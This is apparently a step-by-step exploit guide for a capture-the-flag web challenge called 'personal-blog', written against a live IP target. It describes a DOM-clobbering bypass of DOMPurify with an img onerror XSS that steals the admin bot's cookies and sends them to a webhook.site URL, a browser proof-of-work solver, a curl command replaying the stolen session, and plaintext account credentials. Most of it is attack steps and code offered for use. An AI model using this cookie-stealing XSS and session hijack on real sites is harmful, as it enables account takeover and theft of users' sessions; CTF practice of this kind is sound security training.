# Personal Blog CTF - Complete Exploit Instructions

## Current Status ✅
- **Payload uploaded** to post ID 647
- **Magic URL created** with token `8e72f63235b6a4d5aed77b3754eef891`
- **Webhook configured** at: https://webhook.site/bd12ea19-e710-4806-9eb2-b7d0c3a2b4a8
- **Ready to trigger** admin bot!

## Quick Path to Flag 🚩

### Method 1: Browser Auto-Exploit (Easiest)
1. **Open** `auto_exploit.html` in your browser:
   ```
   File > Open > Navigate to:
   C:\Users\duynh\Documents\Code\CTF\uotfctf2025\Web\personal-blog\personal-blog\auto_exploit.html
   ```

2. **Click** the green button "Solve PoW & Submit to Admin Bot"

3. **Wait** for the PoW to solve (1-2 minutes, watch the log)

4. **Check webhook** when prompted - look for `sid_prev=` value

5. **Enter cookie** and click "Get Flag"

6. **Done!** Flag will be displayed

### Method 2: Manual Browser Exploit
1. **Go to**: http://34.26.148.28:5000/report

2. **Login**:
   - Username: `hacker1768048343`
   - Password: `password123`

3. **Paste URL** in the form:
   ```
   http://34.26.148.28:5000/magic/8e72f63235b6a4d5aed77b3754eef891?redirect=/edit/647
   ```

4. **Open DevTools** (Press F12)

5. **Go to Console tab**

6. **Copy/paste this entire JavaScript block** to solve PoW:
   ```javascript
   const POW_MOD = (1n << 1279n) - 1n;
   const challenge = document.querySelector('[name="pow_challenge"]').value;
   const parts = challenge.split('.');
   const dBytes = Uint8Array.from(atob(parts[1]), c => c.charCodeAt(0));
   const padded = new Uint8Array(4);
   padded.set(dBytes, 4 - dBytes.length);
   const difficulty = (padded[0] << 24) | (padded[1] << 16) | (padded[2] << 8) | padded[3];
   const xBytes = Uint8Array.from(atob(parts[2]), c => c.charCodeAt(0));
   let x = 0n;
   for (let i = 0; i < xBytes.length; i++) x = (x << 8n) | BigInt(xBytes[i]);
   console.log('Solving PoW, difficulty:', difficulty);
   for (let y = 0; y < 100000; y++) {
       if (y % 10000 === 0) console.log('Tried', y, 'values...');
       let current = BigInt(y);
       for (let i = 0; i < difficulty; i++) {
           current = current ^ 1n;
           current = (current * current) % POW_MOD;
       }
       if (current === x || current === POW_MOD - x) {
           const yBytes = [];
           let temp = y;
           if (temp === 0) yBytes.push(0);
           else while (temp > 0) { yBytes.unshift(temp & 0xff); temp >>= 8; }
           const solution = 's.' + btoa(String.fromCharCode(...yBytes));
           console.log('✅ SOLUTION FOUND:', solution);
           document.querySelector('[name="pow_solution"]').value = solution;
           alert('PoW solved! Solution: ' + solution);
           break;
       }
   }
   ```

7. **Wait** for "SOLUTION FOUND" in console (usually < 1 minute)

8. **Submit the form** (the PoW solution field will be auto-filled)

9. **You should see**: "Admin is on the way"

10. **Open webhook** in new tab: https://webhook.site/bd12ea19-e710-4806-9eb2-b7d0c3a2b4a8

11. **Wait 10-15 seconds** for admin bot to visit

12. **Look for request** with query parameter containing cookie data

13. **Find `sid_prev=`** in the cookie value (copy everything after `sid_prev=` up to `;` or end)

14. **Get the flag**:
    ```bash
    curl -b 'sid=PASTE_STOLEN_SID_PREV_HERE' http://34.26.148.28:5000/flag
    ```

## What's Happening Behind the Scenes 🔍

1. **Admin bot** receives report with magic URL
2. **Bot visits** the magic URL
3. **Magic link handler**:
   - Saves admin's current session to `sid_prev` cookie
   - Creates new session for admin
   - Redirects to `/edit/647`
4. **Editor loads** with our malicious payload (unsanitized)
5. **DOM Clobbering** occurs:
   ```html
   <form id="DOMPurify">
   <img name="sanitize" src=x onerror="...XSS...">
   </form>
   ```
   This makes `window.DOMPurify` = the form element
6. **XSS executes** from `<img onerror>`, stealing `document.cookie`
7. **Cookie sent** to webhook includes `sid_prev` with admin's session
8. **We use** that session to access `/flag` endpoint

## Troubleshooting 🔧

**Q: PoW solver times out?**
- Increase the loop limit (change `100000` to `200000`)
- Or wait for a new challenge (refresh the page)

**Q: Webhook doesn't receive anything?**
- Make sure you submitted after solving PoW
- Wait full 15 seconds for bot to visit
- Check webhook page is actually open and refreshed

**Q: "Admins only" when getting flag?**
- Double-check you copied the correct `sid_prev` value
- Make sure you're using it as the `sid` cookie (not `sid_prev`)
- Session might have expired - rerun entire exploit

**Q: PoW solver doesn't find solution?**
- The solution might be > 100000, increase the limit
- Or get a fresh challenge by refreshing the report page

## Expected Flag Format
```
ouftctf{...}
```

## Files Reference
- `auto_exploit.html` - Browser-based automated tool ⭐
- `final_exploit.py` - Python setup script (already run)
- `SOLUTION.md` - Technical vulnerability analysis
- `README_EXPLOIT.md` - Overview and summary
- `THIS_FILE` - Step-by-step instructions

## Key URLs
- **Target**: http://34.26.148.28:5000
- **Report page**: http://34.26.148.28:5000/report
- **Magic URL**: http://34.26.148.28:5000/magic/8e72f63235b6a4d5aed77b3754eef891?redirect=/edit/647
- **Webhook**: https://webhook.site/bd12ea19-e710-4806-9eb2-b7d0c3a2b4a8
- **Flag endpoint**: http://34.26.148.28:5000/flag

## Credentials
- **Username**: hacker1768048343
- **Password**: password123

---

**Good luck! You're one step away from the flag! 🚩**

